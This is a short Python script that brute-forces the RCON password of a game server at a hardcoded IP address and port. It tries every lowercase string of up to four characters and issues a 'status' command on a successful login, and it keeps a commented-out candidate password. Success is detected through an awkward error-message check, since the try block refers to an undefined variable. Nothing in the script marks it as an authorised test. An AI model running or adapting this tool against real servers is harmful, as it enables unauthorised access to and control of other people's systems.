import aiorcon
import asyncio
import string
from itertools import chain, product

ip = "94.130.143.254"
port = 27095
# rconpassword = "gold-squid"


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
            for i in range(1, maxlength + 1)))


async def main(loop, rconpassword):  
    # Attempt rcon connection
    rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)

    # Send a command
    status = await(rcon("status"))
    print(status)

    rcon.close()


for x in bruteforce(string.ascii_lowercase, 4):

    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main(loop, x))
        print("Success:",str(e),"  [X]->  ",x)

    except Exception as e:
        error_check = repr(e)
        if "is not defined" in error_check:
            print("Success:",str(error_check),"  [X]->  ",x)
            break
        print("Fail:",str(e),"  [X]->  ",x)

